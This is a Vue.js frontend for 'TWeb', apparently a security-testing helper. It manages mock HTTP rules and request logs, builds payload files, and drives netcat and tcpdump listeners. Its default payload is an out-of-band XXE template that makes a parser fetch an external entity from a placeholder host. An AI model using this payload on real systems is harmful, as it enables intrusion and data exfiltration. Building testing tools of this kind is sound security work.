var app = new Vue({
    el: '#app',
    data: {
        title: 'TWeb',
        message: '',
        rules: [],
        rule: {
            method: "GET",
            path: '/',
            code: 200,
        },
        currentRule: {},
        ruleIndex: 0,
        vars: [],
        logs: {},
        payload: `<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://{{host}}/">
%remote;
]>`,
        socket: null,
        ncProtocol: 'tcp',
        ncStatus: 0,
        ncPort: 8080,
        interfaces: {},
        interface: 'Choose...',
        tcpdumpProtocol: 'icmp',
        tcpdumpStatus: 0,
        ncMessage: '',
        msg: '',
        tcpdumpMessage: '',
        currentPage: null,
        showMsg: false
    },
    filters: {
        more(s, l) {
            if (s && s.length >= l) {
                return `${s.slice(0, l)} ...`
            }
            return s
        },
        pretty(s) {
            return JSON.stringify(s, null, 2)
        }
    },
    methods: {
        getFile(type) {
            let filename = `payload.${type}`;
            axios.post(`/api/file/${type}`, { payload: this.payload }, { responseType: 'blob' })
                .then(resp => {
                    let disposition = resp.headers["content-disposition"]
                    if (disposition) {
                        filename = disposition.split('=')[1]
                    }

                    let blob = new Blob([resp.data])
                    let link = document.createElement('a');
                    link.href = window.URL.createObjectURL(blob);
                    link.download = filename
                    link.click();
                    window.URL.revokeObjectURL(link.href);
                })
        },
        getVars() {
            axios("/api/vars")
                .then(resp => {
                    this.vars = resp.data.data
                })
        },
        saveVars(vars) {
            axios.post("/api/vars", vars)
                .then(resp => {
                    if (resp.data.message == "ok") {
                        $('#settingModal').modal('toggle')
                        this.message = 'Update Success'
                        $('#msgModal').modal('toggle')
                    }
                })
        },
        delLog(log) {
            axios.delete(`/api/logs/del/${log.id}`).then(resp => {
                if (resp.data.message == "ok") {
                    let index = this.logs.indexOf(log)
                    this.logs.splice(index, 1)
                }
            })
        },
        delAllLog(rule) {
            axios.delete(`/api/logs/del/${rule.id}/all`).then(resp => {
                if (resp.data.message == "ok") {
                    this.logs = []
                    this.getRuleList()
                }
            })
        },
        viewLogBtn(rule) {
            this.switchCurrent(rule)
            this.getLogsById(rule.id)
            $("#logModal").modal("toggle")
        },
        getLogsById(rid) {
            axios(`/api/rules/${rid}/log`)
                .then(resp => {
                    this.logs = resp.data.data
                })
        },
        getRuleList() {
            axios("/api/rules", { params: { page: this.currentPage } })
                .then(resp => {
                    this.rules = resp.data.data
                    this.$nextTick(() => {
                        $('[data-toggle="tooltip"]').tooltip()
                    })
                })
        },
        getInterfaces() {
            axios("/api/interfaces")
                .then(resp => {
                    this.interfaces = resp.data.data
                })
        },
        switchCurrent(rule) {
            this.currentRule = JSON.parse(JSON.stringify(rule))
            console.log(this.currentRule)
            this.ruleIndex = this.rules.indexOf(rule)
        },
        updateRuleBtn(rule) {
            this.switchCurrent(rule)
            $("#updateModal").modal("toggle")
        },
        updateRule(rule) {
            axios.post("/api/rules/update", rule)
                .then(resp => {
                    if (resp.data.message == "ok") {
                        this.getRuleList()
                        $('#updateModal').modal('hide')
                        this.showMsg = true
                    }
                })
        },
        addRule(rule) {
            axios.post("/api/rules/add", rule)
                .then(resp => {
                    if (resp.data.message == "ok") {
                        this.getRuleList()
                        $('#addModal').modal('hide')
                        this.currentRule = rule
                        this.rule = {}
                        this.showMsg = true
                    }
                })
        },
        delRule(rule) {
            axios.delete(`/api/rules/del/${rule.id}`)
                .then(resp => {
                    if (resp.data.message == "ok") {
                        this.getRuleList()
                    }
                })
        },
        addRuleBtn(rule) {
            if (!rule.method || !rule.path) { alert("Parameter cannot be empty"); return; }
            if (rule.method.indexOf(",") !== -1) {
                rule.method = rule.method.split(",")
            } else {
                rule.method = [rule.method]
            }
            rule.headers = []
            rule.remote = ""
            this.addRule(rule)
        },
        delRuleBtn(rule) {
            this.delRule(rule)
        },
        saveRuleBtn(rule) {
            if (rule.method.indexOf(",") !== -1) {
                rule.method = rule.method.split(",")
            } else if (rule.method instanceof Array) {
                rule.method = rule.method
            } else {
                rule.method = [rule.method]
            }
            this.rules[this.ruleIndex] = rule
            this.updateRule(rule)
        },
        addVarsBtn() {
            this.vars.push({})
        },
        delVarsBtn(index) {
            this.vars.splice(index, 1)
        },
        addHeaderBtn() {
            this.currentRule.headers.push({})
        },
        delHeaderBtn(index) {
            this.currentRule.headers.splice(index, 1)
        },
        addCurrentHeaderBtn() {
            this.currentRule.remote.headers.push({})
        },
        delCurrentHeaderBtn(index) {
            this.currentRule.remote.headers.splice(index, 1)
        },
        refreshBtn() {
            this.getRuleList()
        },
        initWebSocket() {
            this.socket = io.connect('http://' + document.domain + ':' + location.port)
            this.socket.on('nc_status', data => {
                this.ncStatus = data
            })
            this.socket.on('recv_nc_message', data => {
                this.ncMessage += `${data}\r\n`
            })

            this.socket.on('tcpdump_status', data => {
                this.tcpdumpStatus = data
            })

            this.socket.on('recv_tcpdump_message', data => {
                this.tcpdumpMessage += `${data}\r\n`
            })
        },
        startNc() {
            this.socket.emit('start_nc', this.ncProtocol, this.ncPort)
        },
        switchNc() {
            if (this.ncStatus) {
                this.stopNc()
            } else {
                this.startNc()
            }
        },
        stopNc() {
            this.socket.emit('stop_nc')
        },
        sendMsg() {
            this.socket.emit('send_message', this.msg)
        },
        clearNcMessage() {
            this.ncMessage = ''
        },

        startTcpdump() {
            this.socket.emit('start_tcpdump', this.tcpdumpProtocol, this.interface)
        },
        switchTcpdump() {
            if (this.tcpdumpStatus) {
                this.stopTcpdump()
            } else {
                this.startTcpdump()
            }
        },
        stopTcpdump() {
            this.socket.emit('stop_tcpdump')
        },
        clearTcpdumpMessage() {
            this.tcpdumpMessage = ''
        }

    },
    created() {},
    mounted() {
        this.getRuleList()
        this.getVars()
        this.getInterfaces()
        this.initWebSocket()
    },
})
